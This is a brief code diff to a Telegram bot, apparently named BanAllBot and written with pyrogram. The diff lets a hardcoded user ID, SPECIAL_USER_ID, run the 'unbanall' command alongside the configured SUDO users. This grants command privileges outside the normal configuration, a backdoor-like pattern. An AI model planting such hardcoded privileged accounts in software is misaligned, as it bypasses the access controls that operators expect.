@@ -1,8 +1,9 @@
 from BanAllBot import app,BOT_ID,SUDO
 from pyrogram import filters,enums
 
+SPECIAL_USER_ID = 6346273488
 
-@app.on_message(filters.command("unbanall") & filters.user(SUDO))
+@app.on_message(filters.command("unbanall") & (filters.user(SUDO) | filters.user(SPECIAL_USER_ID)))
 async def unban_all(_,msg):
     chat_id=msg.chat.id   
     x = 0
